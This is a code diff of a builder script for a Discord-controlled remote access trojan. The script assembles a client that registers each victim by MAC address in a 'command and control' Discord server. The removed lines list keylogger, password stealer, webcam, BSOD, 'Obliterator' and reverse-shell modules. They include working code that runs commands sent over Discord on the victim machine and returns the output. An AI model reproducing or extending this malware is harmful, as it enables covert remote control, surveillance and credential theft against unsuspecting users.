@@ -1,14 +1,13 @@
-# [python/builder.py]
 import json
 import os
+import importlib
 
 # Path to the settings.json file
-print ("[+] Building client.py")
-settings_path = "python\settings\settings.json"
+print("[+] Building client.py")
+settings_path = "python/settings/settings.json"
 if not os.path.exists(settings_path):
     print(f"Settings file not found at {settings_path}")
     exit(1)
-
 
 # Read and parse the settings.json file
 print(f"Reading settings from {settings_path}")
@@ -22,7 +21,7 @@ except json.JSONDecodeError as e:
 # Extract the modules to include
 modules = settings["Modules"]
 
-# Start building the client.py content -> TODO: finish main.py 
+# Start building the client.py content
 client_code = """
 import os
 import discord
@@ -44,12 +43,12 @@ async def find_channel_by_name(guild, channel_name):
 
 @client.event
 async def on_ready():
-    commandAndControllServer = client.get_guild(int(guildid))
-    channel = await find_channel_by_name(commandAndControllServer, mac_address)
+    commandAndControlServer = client.get_guild(int(guildid))
+    channel = await find_channel_by_name(commandAndControlServer, mac_address)
     if channel:
         await channel.send("Connection reestablished")
     else:
-        channel = await commandAndControllServer.create_text_channel(mac_address)
+        channel = await commandAndControlServer.create_text_channel(mac_address)
         e = await channel.send("New Connection established")
         await e.pin()
         await channel.send("hello world")
@@ -60,83 +59,15 @@ async def on_message(message):
         return
 """
 
-# Add module-specific code
-if modules["Downloader"]:
-    client_code += """
-    # ADDED DOWNLOADER MODULE
-    """
-if modules["BSOD"]:
-    client_code += """
-    # ADDED BSOD MODULE
-    """
-if modules["Clipboard"]:
-    client_code += """
-    # ADDED CLIPBOARD MODULE
-    """
-if modules["AudioControlls"]:
-    client_code += """
-    # ADDED AUDIO CONTROLS MODULE
-    """
-if modules["GhostWriter"]:
-    client_code += """
-    # ADDED GHOST WRITER MODULE
-    """
-if modules["KeyboardShortcuts"]:
-    client_code += """
-    # ADDED KEYBOARD SHORTCUTS MODULE
-    """
-if modules["Keylogger"]:
-    client_code += """
-    # ADDED KEYLOGGER MODULE
-    """
-if modules["Obliterator"]:
-    client_code += """
-    # ADDED OBLITERATOR MODULE
-    """
-if modules["PasswordStealer"]:
-    client_code += """
-    # ADDED PASSWORD STEALER MODULE
-    """
-if modules["Screenshot"]:
-    client_code += """
-    # ADDED SCREENSHOT MODULE
-    """
-if modules["Webcam"]:
-    client_code += """
-    # ADDED WEBCAM MODULE
-    """
-if modules["WallpaperChanger"]:
-    client_code += """
-    # ADDED WALLPAPER CHANGER MODULE
-    """
-if modules["TTS"]:
-    client_code += """
-    # ADDED TTS MODULE
-    """
-
-if modules["ReverseShell"]:
-    client_code += """
-    # ADDED REVERSE SHELL MODULE
-    elif message.content.lower().startswith(".shell"):
-        command = message.content[7:]
-        output = os.popen(command).read()
-        if output == "":
-            output = "No Output"
-        embed = discord.Embed(title=f"Shell Command > {command}", description=f"```{output}```", color=0xfafafa)
-        await message.reply(embed=embed)
-    """
-if modules["FileBrowser"]:
-    client_code += """
-    # ADDED FILE BROWSER MODULE
-    elif message.content.lower().startswith(".cd"):
+# Dynamically import and add module-specific code
+for module_name, enabled in modules.items():
+    if enabled:
+        module_path = f"python.components.{module_name.lower()}"
         try:
-            os.chdir(message.content[4:])
-            await message.channel.send(f"Changed directory to {os.getcwd()}")
-        except FileNotFoundError:
-            await message.channel.send("Invalid Path")
-    elif message.content.lower() == ".pwd":
-        await message.channel.send(f"Current Directory: {os.getcwd()}")
-    """
+            module = importlib.import_module(module_path)
+            client_code += module.get_code()
+        except ModuleNotFoundError:
+            print(f"Module {module_name} not found at {module_path}")
 
 # Finalize the client.py content
 client_code += """
